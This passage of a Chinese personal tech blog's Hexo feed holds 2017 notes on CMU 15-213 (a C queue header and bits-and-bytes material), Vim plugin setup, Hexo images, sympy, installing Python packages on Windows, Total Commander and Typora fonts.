class="line"></span><br><span class="line"><span class="comment">/************** Data structure declarations ****************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Linked list element (You shouldn't need to change this) */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; <span class="keyword">list_ele_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Queue structure */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_ele_t</span> *head;  <span class="comment">/* Linked list of elements */</span></span><br><span class="line"><span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      You will need to add more fields to this structure</span></span><br><span class="line"><span class="comment">      to efficiently implement q_size and q_insert_tail</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125; <span class="keyword">queue_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************** Operations on queue ************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Create empty queue.</span></span><br><span class="line"><span class="comment">  Return NULL if could not allocate space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">queue_t</span> *q_new();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Free all storage used by queue.</span></span><br><span class="line"><span class="comment">  No effect if q is NULL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_free</span><span class="params">(<span class="keyword">queue_t</span> *q)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Attempt to insert element at head of queue.</span></span><br><span class="line"><span class="comment">  Return true if successful.</span></span><br><span class="line"><span class="comment">  Return false if q is NULL or could not allocate space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">q_insert_head</span><span class="params">(<span class="keyword">queue_t</span> *q, <span class="keyword">int</span> v)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Attempt to insert element at tail of queue.</span></span><br><span class="line"><span class="comment">  Return true if successful.</span></span><br><span class="line"><span class="comment">  Return false if q is NULL or could not allocate space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">q_insert_tail</span><span class="params">(<span class="keyword">queue_t</span> *q, <span class="keyword">int</span> v)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Attempt to remove element from head of queue.</span></span><br><span class="line"><span class="comment">  Return true if successful.</span></span><br><span class="line"><span class="comment">  Return false if queue is NULL or empty.</span></span><br><span class="line"><span class="comment">  If vp non-NULL and element removed, store removed value at *vp.</span></span><br><span class="line"><span class="comment">  Any unused storage should be freed</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">q_remove_head</span><span class="params">(<span class="keyword">queue_t</span> *q, <span class="keyword">int</span> *vp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Return number of elements in queue.</span></span><br><span class="line"><span class="comment">  Return 0 if q is NULL or empty</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">q_size</span><span class="params">(<span class="keyword">queue_t</span> *q)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Reverse elements in queue</span></span><br><span class="line"><span class="comment">  No effect if q is NULL or empty</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><code>http://blog.csdn.net/feliciafay/article/details/6841115</code>单链表的反转</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>vim的插件折腾</title>
      <link href="/2017/11/27/vim%E7%9A%84%E6%8F%92%E4%BB%B6%E6%8A%98%E8%85%BE/"/>
      <url>/2017/11/27/vim%E7%9A%84%E6%8F%92%E4%BB%B6%E6%8A%98%E8%85%BE/</url>
      
        <content type="html"><![CDATA[<p>好久没有写c了，发现用Vim写c有点问题，所以就装了一些插件。</p><p>主要是通过Vundle来管理插件。</p><h2 id="Vundle"><a href="#Vundle" class="headerlink" title="Vundle"></a>Vundle</h2><p>GitHub地址：<code>https://github.com/VundleVim/Vundle.vim</code><br>安装Vundle和安装插件都很简单，把卸载插件的方法记录一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">3.7 CLEANING UP ~</span><br><span class="line">                                      *vundle-plugins-cleanup* *:PluginClean*</span><br><span class="line">&gt;</span><br><span class="line">  :PluginClean</span><br><span class="line"></span><br><span class="line">Requests confirmation for the removal of all plugins no longered configured</span><br><span class="line">in your `.vimrc` but present in your bundle installation directory</span><br><span class="line">(default: `.vim/bundle/`).</span><br><span class="line"></span><br><span class="line">                                                              *:PluginClean!*</span><br><span class="line">&gt;</span><br><span class="line">  :PluginClean!</span><br><span class="line"></span><br><span class="line">Automatically confirm removal of unused bundles.</span><br></pre></td></tr></table></figure></p><h2 id="Vim-colorschemes"><a href="#Vim-colorschemes" class="headerlink" title="Vim colorschemes"></a>Vim colorschemes</h2><p>GitHub地址：<code>https://github.com/flazz/vim-colorschemes</code><br>这个安装以后就有很多颜色主题了。</p><h2 id="vim-cpp"><a href="#vim-cpp" class="headerlink" title="vim.cpp"></a>vim.cpp</h2><p>This file contains additional syntax highlighting that I use for C++11/14/17 development in Vim. Compared to the standard syntax highlighting for C++ it adds highlighting of (user defined) functions and the containers and types in the standard library / boost.</p><p>Development is done at: <a href="http://github.com/octol/vim-cpp-enhanced-highlight" target="_blank" rel="noopener">http://github.com/octol/vim-cpp-enhanced-highlight</a><br>主要是C++的语法高亮</p><h2 id="YouCompleteMe"><a href="#YouCompleteMe" class="headerlink" title="YouCompleteMe"></a>YouCompleteMe</h2><p>这个是很难安装的插件，不过之前折腾过一次安装成功了。但是没有安装C家族的支持。<br><code>https://github.com/Valloric/YouCompleteMe</code><br>官网上说的很清楚，但是上次还是踩了一些坑。</p><ul><li>python环境变量好像只能配置一个，多的删掉。</li><li>Vim要64位的，官方好像没有。找的非官方编译版。</li><li>还有些坑可能忘了<br>今天的安装比较顺利，它下载Clang用了一些时间，但是最后安装成功。<br>但是用了以后发现报错<br><code>ValueError: Still no compile flags, no completions yet</code><br>解决办法：<br><code>https://github.com/Valloric/YouCompleteMe/issues/700</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let g:ycm_global_ycm_extra_conf = &apos;/前面的路径/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp/ycm/.ycm_extra_conf.py&apos;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Asyncrun"><a href="#Asyncrun" class="headerlink" title="Asyncrun"></a>Asyncrun</h2><p>这个是蛮厉害一个插件，默认Quickfix窗口是不显示的。<br>可能是我不会用，目前感觉不好使。<br>所以一键运行还是照别人的。大概是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span><br><span class="line">&quot; Quickly Run</span><br><span class="line">&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">map &lt;F5&gt; :call CompileRunGcc()&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">func! CompileRunGcc()</span><br><span class="line">    exec &quot;w&quot; </span><br><span class="line">    if &amp;filetype == &apos;c&apos; </span><br><span class="line">        exec &apos;!g++ % -o %&lt;&apos;</span><br><span class="line">        exec &apos;!time ./%&lt;&apos;</span><br><span class="line">    elseif &amp;filetype == &apos;cpp&apos;</span><br><span class="line">        exec &apos;!g++ % -o %&lt;&apos;</span><br><span class="line">        exec &apos;!time ./%&lt;&apos;</span><br><span class="line">    elseif &amp;filetype == &apos;python&apos;</span><br><span class="line">        exec &apos;!time python %&apos;</span><br><span class="line">    elseif &amp;filetype == &apos;sh&apos;</span><br><span class="line">        :!time bash %</span><br><span class="line">    endif                                                                              </span><br><span class="line">endfunc</span><br></pre></td></tr></table></figure></p><p>但应该是系统的缘故，所以有所不同。win下应该是这样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if &amp;filetype == &apos;c&apos;</span><br><span class="line">exec &quot;!gcc % -o %&lt;&quot;</span><br><span class="line">exec &quot;!%&lt;&quot;</span><br><span class="line">elseif &amp;filetype == &apos;cpp&apos;</span><br><span class="line">exec &quot;!gcc % -o %&lt;&quot;</span><br><span class="line">exec &quot;!%&lt;&quot;</span><br><span class="line">elseif &amp;filetype == &apos;python&apos;</span><br><span class="line">           exec &quot;!python %&quot;</span><br></pre></td></tr></table></figure></p><p>暂时只用得到这三个。<br>感叹号是呼出系统命令， %号是文件名， %&lt;是去后缀的文件名。<br>折腾半天得出来的结果。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>15-213 Bits, Bytes, &amp;Integers1</title>
      <link href="/2017/11/26/15-213-Bits-Bytes-Integers1/"/>
      <url>/2017/11/26/15-213-Bits-Bytes-Integers1/</url>
      
        <content type="html"><![CDATA[<h1 id="Bits-Bytes-and-Integers-Part-1"><a href="#Bits-Bytes-and-Integers-Part-1" class="headerlink" title="Bits, Bytes and Integers - Part 1"></a>Bits, Bytes and Integers - Part 1</h1><h2 id="Everything-is-bits"><a href="#Everything-is-bits" class="headerlink" title="Everything is bits"></a>Everything is bits</h2><h3 id="Each-bit-is-0-or-1"><a href="#Each-bit-is-0-or-1" class="headerlink" title="Each bit is 0 or 1"></a>Each bit is 0 or 1</h3><h3 id="By-encoding-interpreting-sets-of-bits-in-various-ways"><a href="#By-encoding-interpreting-sets-of-bits-in-various-ways" class="headerlink" title="By encoding/interpreting sets of bits in various ways"></a>By encoding/interpreting sets of bits in various ways</h3><ul><li>Computers determine what to do (instructions)</li><li>… and represent and manipulate numbers, sets, strings, etc…<h3 id="Why-bits-Electronic-Implementation"><a href="#Why-bits-Electronic-Implementation" class="headerlink" title="Why bits? Electronic Implementation"></a>Why bits? Electronic Implementation</h3></li><li>Easy to store with bistable elements</li><li>Reliably transmitted on noisy and inaccurate wires<h2 id="Encoding-Byte-Values"><a href="#Encoding-Byte-Values" class="headerlink" title="Encoding Byte Values"></a>Encoding Byte Values</h2>0 0 0000<br>1 1 0001<br>2 2 0010<br>3 3 0011<br>4 4 0100<br>5 5 0101<br>6 6 0110<br>7 7 0111<br>8 8 1000<br>9 9 1001<br>A 10 1010<br>B 11 1011<br>C 12 1100<br>D 13 1101<br>E 14 1110<br>F 15 1111</li></ul><h2 id="Boolean-Algebra"><a href="#Boolean-Algebra" class="headerlink" title="Boolean Algebra"></a>Boolean Algebra</h2><p>And<br> A&amp;B = 1 when both A=1 and B=1<br>Or<br> A|B = 1 when either A=1 or B=1<br>Not<br>~A = 1 when A=0<br>Exclusive-Or (Xor)<br>A^B = 1 when either A=1 or B=1, but not both</p><h2 id="Example-Representing-amp-Manipulating-Sets"><a href="#Example-Representing-amp-Manipulating-Sets" class="headerlink" title="Example: Representing &amp; Manipulating Sets"></a>Example: Representing &amp; Manipulating Sets</h2><h3 id="Representation"><a href="#Representation" class="headerlink" title="Representation"></a>Representation</h3><ul><li>Width w bit vector represents subsets of {0, …, w–1}</li><li>a j = 1 if j ∈ A<ul><li>01101001 { 0, 3, 5, 6 }</li><li>76543210</li><li>01010101 { 0, 2, 4, 6 }</li><li>76543210<h3 id="Operations"><a href="#Operations" class="headerlink" title="Operations"></a>Operations</h3></li></ul></li><li><p>&amp; Intersection 01000001 { 0, 6 }</p></li><li><p>| Union 01111101 { 0, 2, 3, 4, 5, 6 }</p></li><li><p>^ Symmetric difference 00111100 { 2, 3, 4, 5 }</p></li><li><p>~ Complement 10101010 { 1, 3, 5, 7 }</p></li></ul><h2 id="Shift-Operations"><a href="#Shift-Operations" class="headerlink" title="Shift Operations"></a>Shift Operations</h2><ul><li>Left Shift: x &lt;&lt; y<ul><li>Shift bit-vector x left y positions<br>– Throw away extra bits on left<br>Fill with 0 ’s on rightShift bit-vector x left y positions</li></ul></li><li>Right Shift: x &gt;&gt; y<ul><li>Shift bit-vector x right y positions </li><li>Logical shift  Fill with 0 ’s on left</li><li>Arithmetic shift  Replicate most significant bit on left</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>hexo文章中加入图片</title>
      <link href="/2017/11/25/hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E5%8A%A0%E5%85%A5%E5%9B%BE%E7%89%87/"/>
      <url>/2017/11/25/hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E5%8A%A0%E5%85%A5%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<p>前面发出来那篇第三方包安装发现图片都没有加载出来，目前已经解决了这个问题。<br>解决方案如下：</p><ol><li>修改<code>_config.yml</code>文件中 <code>post_asset_folder</code>项为<code>true</code></li><li>安装插件<code>npm install hexo-asset-image --save</code></li><li>将图片放入文件夹中，可以用<code>![]()</code>方法引入图片</li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Python 求导 和 安装第三方包中出现的小问题</title>
      <link href="/2017/11/25/20171125/"/>
      <url>/2017/11/25/20171125/</url>
      
        <content type="html"><![CDATA[<h2 id="sympy"><a href="#sympy" class="headerlink" title="sympy"></a>sympy</h2><p>之前函数求导一直用MATLAB，现在发现几乎所有Matlab的功能都能够用python代替。<br>今天发现了sympy这个库。<br>简单的使用方法如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">x=Symbol(<span class="string">"x"</span>)</span><br><span class="line">diff(<span class="number">1</span>/(<span class="number">1</span>+x**<span class="number">2</span>),x)</span><br></pre></td></tr></table></figure></p><p>有时间再去仔细看看这个。</p><h2 id="WordCloud-安装"><a href="#WordCloud-安装" class="headerlink" title="WordCloud 安装"></a>WordCloud 安装</h2><p>今天刚好有人在WordCloud安装时碰到了问题，自己一试，刚开始也没装上。<br>错误提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError: &apos;utf-8&apos; codec can&apos;t decode byte 0xa1 in position 55: invalid start byte</span><br></pre></td></tr></table></figure></p><p>看上去是字符编码问题，但是目前没搞懂产生问题的原因。<br>另外一个人碰到的问题是提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: Microsoft Visual C++ 14.0 is required.</span><br></pre></td></tr></table></figure></p><p>这个因为我安装了VS2017，所以没有这个提示。<br>我看了下WordCloud的官网，发现有这样的提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worcloud depends on numpy&gt;=1.5.1, pillow and matplotlib. To install it via pip, you will also need a C compiler.</span><br></pre></td></tr></table></figure></p><p>那么理论上来讲装了VS2017应该就没事了。但是这种解决方法毕竟太麻烦。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If you&apos;re having trouble with pip installation on windows, you can find a .whl file at:</span><br><span class="line"></span><br><span class="line">http://www.lfd.uci.edu/~gohlke/pythonlibs/#wordcloud</span><br></pre></td></tr></table></figure></p><p>官网上也给了相应的解决办法。<br>直接去下编译好的Whl包进行安装。<br>最后成功解决问题。</p><p>后来在网上查了一下，在windows下使用pip安装一些python的第三方库，有很多都使用了C写一些扩展，需要使用相应的编译环境进行编译安装。<br>所以直接下载编译好的wheel安装包就非常方便，UCI(加州大学尔湾分校)就提供了大量已经编译打包好的针对windows的wheel安装包，刚好发现上面的下载地址就来源于这。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.lfd.uci.edu/~gohlke/pythonlibs/</span><br></pre></td></tr></table></figure></p><p>这个页面相当熟悉，原来来过很多次今天才知道这里存在的意义。关键是有很多科学计算的包可以直接从这里下载。果断收藏。<br>前面编码的问题也由此得到解决，但是还是找不到问题产生的原因。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Python 安装第三方包</title>
      <link href="/2017/11/23/Python%20%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85/"/>
      <url>/2017/11/23/Python%20%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-安装第三方包"><a href="#Python-安装第三方包" class="headerlink" title="Python 安装第三方包"></a>Python 安装第三方包</h1><h2 id="环境变量和pip简介"><a href="#环境变量和pip简介" class="headerlink" title="环境变量和pip简介"></a>环境变量和pip简介</h2><h3 id="环境变量（environment-variables）"><a href="#环境变量（environment-variables）" class="headerlink" title="环境变量（environment variables）"></a>环境变量（environment variables）</h3><p>一般是指在操作系统中用来指定操作系统运行环境的一些参数，如临时文件夹位置和系统文件夹位置等。</p><ul><li><p>PATH 罗列出 shell 搜索 用户 输入的执行命令所在的目录。</p></li><li><p>HOME (类Unix系统) 和 userprofile (Microsoft Windows) 表示用户的主目录在文件系统中的位置。等等…</p><p>Windows和DOS操作系统中的path环境变量，当要求系统运行一个程序而没有告诉它程序所在的完整路径时，系统除了在当前目录下面寻找此程序外，还应到path中指定的路径去找。之后的环境变量配置跟PATH有关。</p><h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3></li></ul><p>pip是一个用来安装和管理Python包的工具。</p><p>官方文档：<code>https://pip.pypa.io/en/latest/</code></p><p> <br></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>假设大家都安装了Python。那么就可以测试一下是否配置好了系统环境变量和pip。</p><p>按<code>win</code>+<code>r</code>键 输入<code>cmd</code>后回车</p><p><img src="微信截图_20171123154242.png" alt="微信截图_20171123154242"></p><p>会出现CMD窗口</p><p><img src="微信截图_20171123154446.png" alt="微信截图_20171123154446"></p><p>可以输入 <code>python</code> 后回车，如果出现上图的提示代表环境变量是配置好的。</p><p>那么通过输入<code>quit()</code>来退出python环境，再输入<code>pip</code>后回车。如果出现上图的提示代表pip是已经安装好的了。</p><p>那么就可以开始通过pip来安装第三方包。可以跳过环境变量配置和pip安装过程。</p><p>如果没有上述提示，代表没有配置好。</p><p><br></p><h2 id="环境变量配置和pip安装"><a href="#环境变量配置和pip安装" class="headerlink" title="环境变量配置和pip安装"></a>环境变量配置和pip安装</h2><p>简单来说有两种配置方式。</p><h3 id="Python安装包法（简单粗暴）"><a href="#Python安装包法（简单粗暴）" class="headerlink" title="Python安装包法（简单粗暴）"></a>Python安装包法（简单粗暴）</h3><p>可以从官网下载python的安装包，下载地址</p><p><code>https://www.python.org/ftp/python/3.6.3/python-3.6.3-amd64.exe</code></p><p>64位</p><p>下载速度太慢或者需要32位的可以找我直接微信传过去。</p><h4 id="之前安装过Python"><a href="#之前安装过Python" class="headerlink" title="之前安装过Python"></a>之前安装过Python</h4><p>如果之前安装过的话，会出现下图的情况<img src="微信截图_20171123160240.png" alt="微信截图_20171123160240"></p><p>那么选择Modify选项</p><p><img src="微信截图_20171123160358.png" alt="微信截图_20171123160358"></p><p>可以看到第二个选项就是pip安装，勾上。Next.</p><p><img src="\微信截图_20171123160509.png" alt="微信截图_20171123160509"></p><p>可以看到第4个选项 Add Python to environment variables 就是将python加入到环境变量中。勾上安装即可。</p><h4 id="之前没有安装过Python"><a href="#之前没有安装过Python" class="headerlink" title="之前没有安装过Python"></a>之前没有安装过Python</h4><p>这种情况和上面大同小异。</p><p><img src="l.png" alt="l"></p><p>注意PATH 和 pip 选项的勾选即可。</p><h3 id="手动配置法"><a href="#手动配置法" class="headerlink" title="手动配置法"></a>手动配置法</h3><h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><p>如果已经安装过python，可以通过手动配置解决问题。</p><p>以Win10为例：</p><p>右键此电脑 -&gt; 菜单 -&gt; 属性 (或 控制面板-&gt;系统和安全-&gt;系统)(也可以直接搜索)</p><p>点击高级系统设置</p><p>高级选项卡下 点击环境变量</p><p>点击环境变量中的PATH变量编辑（用户或者系统都可以）</p><p>将python.exe文件所在的文件目录添加到PATH中去</p><h4 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h4><p>理论上讲一般安装完python时都安装了pip，如果很不幸没有安装pip.也可以手动安装</p><p>下载地址：<code>https://pypi.python.org/pypi/pip#downloads</code></p><p>下载解压后，CMD进入解压目录，输入<code>python setup.py install</code>进行安装</p><p>安装完成后还需要添加环境变量<code>C:\Program Files\Python36\Scripts\</code>(位置可能有不同，重点是scripts文件夹的环境变量配置)</p><p><br></p><h2 id="通过pip安装第三方包"><a href="#通过pip安装第三方包" class="headerlink" title="通过pip安装第三方包"></a>通过pip安装第三方包</h2><h3 id="安装jieba"><a href="#安装jieba" class="headerlink" title="安装jieba"></a>安装jieba</h3><p>类似开始，打开CMD窗口后，直接输入</p><p><code>pip install jieba</code> 或者 <code>pip3 install jieba</code></p><p>就能够安装jieba</p><p>安装好后，通过CMD进入Python输入<code>import jieba</code> 如果没有错误提示就安装成功了。</p><p>jieba项目的Github地址 <code>https://github.com/fxsjy/jieba</code></p><p>有基本介绍和使用方法</p><h3 id="安装词云"><a href="#安装词云" class="headerlink" title="安装词云"></a>安装词云</h3><p>类似与安装jieba</p><p>命令：<code>pip install wordcloud</code></p><p>官网：<code>https://amueller.github.io/word_cloud/</code></p><p>Github:<code>https://github.com/amueller/word_cloud</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>VIM TC Typora 小折腾</title>
      <link href="/2017/11/22/20171122/"/>
      <url>/2017/11/22/20171122/</url>
      
        <content type="html"><![CDATA[<h2 id="VIM-airline插件-及-google-yapf"><a href="#VIM-airline插件-及-google-yapf" class="headerlink" title="VIM airline插件 及 google/yapf"></a>VIM airline插件 及 google/yapf</h2><p>Vim airline插件碰到的问题是三角显示不出来，最后还是去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/powerline/fonts</span><br></pre></td></tr></table></figure></p><p>找到powerline fonts字体安装并修改字体才能够显示成功。不过为了显示成功我还是在_vimrc 文件中加入了下面的语句。折腾半天总算成功了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let g:airline_left_sep = &apos;⮀&apos;</span><br><span class="line">let g:airline_left_alt_sep = &apos;⮁&apos;</span><br><span class="line">let g:airline_right_sep = &apos;⮂&apos;</span><br><span class="line">let g:airline_right_alt_sep = &apos;⮃&apos;</span><br></pre></td></tr></table></figure></p><p>理论上显示的应该是两个向左的箭头和两个向右的箭头，如果没有就是字体没有搞成功。</p><p>另外一个发现的就是google/yapf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/google/yapf</span><br></pre></td></tr></table></figure><p>安装之后在_vimrc文件加入以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autocmd FileType python nnoremap &lt;LocalLeader&gt;= :0,$!yapf&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>这样通过默认的 \键和=键就可以完成Python代码的自动格式化</p><h2 id="Total-Commander-初步折腾"><a href="#Total-Commander-初步折腾" class="headerlink" title="Total Commander 初步折腾"></a>Total Commander 初步折腾</h2><p>前几天开始用TC，刚开始还不知道好在哪。今天发现很多非常节约时间的功能。</p><ol><li>CTRL + B  可以把文件夹全部展开看到所有文件</li><li>CTRL + D 快速跳转文件夹</li><li>ALT + DOWN 查看历史文件夹列表 很好用  不用像以前开很多窗口还找不到。不用快捷键也可以通过小三角打开。</li><li>搜索可以加入everything支持</li><li>按SHIFT在点选大小日期等排序可以多重条件排序</li><li>工具栏可以自定义 我加上了命令行</li><li>可以改一下文件大小的显示设置，GB甚至TB都支持</li><li>可以将最近修改的文件自动用颜色标出</li></ol><h2 id="Typora-更改字体"><a href="#Typora-更改字体" class="headerlink" title="Typora 更改字体"></a>Typora 更改字体</h2><p>我现在的Markdown都在Typora上写，以前主要是代码。没太注重中文的问题，现在打很多中文，用默认的宋体效果不是很好。</p><p>在 Typora 中依次打开 Preferences → Theme → Open Theme Folder</p><p>修改对应主题文件</p><p>将<code>font-family</code>，在 <code>body{  }</code> 里的 <code>font-family</code> 后添加 <code>,&#39;Microsoft YaHei&#39;</code></p><p>要修改多个</p><p>修改好后用着win10 17025后的字体基本上完美</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>开始学习CMU15-213</title>
      <link href="/2017/11/21/1/"/>
      <url>/2017/11/21/1/</url>
      
        <content type="html"><![CDATA[<p>之前多次碰到需要汇编知识的情况，所以一直想开始啃CSAPP。不过书太厚，好像直接看书效果也不是很好，所以找来CMU15-213的视频开始学习。<br>相关资料地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.cs.cmu.edu/~213/schedule.html</span><br></pre></td></tr></table></figure></p><p>可以看到最新的教学视频和课件。</p><h1 id="第一课-Overview"><a href="#第一课-Overview" class="headerlink" title="第一课 Overview"></a>第一课 Overview</h1><p>课程开始举了几个好玩的例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sq</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x*x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> x = atoi(argv[i]);</span><br><span class="line"><span class="keyword">int</span> sx = sq(x);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"sq(%d) = %d\n"</span>, x, sx);</span><br><span class="line">    &#125;</span><br><span class="line"> 